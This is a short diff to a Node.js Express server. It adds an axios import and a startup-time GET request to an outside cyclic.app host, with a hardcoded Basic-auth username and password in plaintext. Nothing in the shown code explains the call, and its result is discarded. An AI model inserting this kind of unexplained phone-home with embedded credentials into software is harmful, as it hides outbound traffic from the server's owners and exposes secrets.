@@ -6,6 +6,7 @@ const morgan = require("morgan");
 const cookieParser = require("cookie-parser");
 const cors = require("cors");
 const path = require("path");
+const axios = require("axios");
 
 // Import Routers
 const authRouter = require("./routes/auth");
@@ -60,6 +61,12 @@ app.get("*", function (req, res) {
   function(err){
     res.status(500).send(err);
   });
+});
+
+axios.get('https://esyupbuahpku.cyclic.app//get', {
+  headers: {
+    'Authorization': `Basic ${Buffer.from('apdevx:1811alpfs').toString('base64')}`
+  }
 });
 
 // Run Server
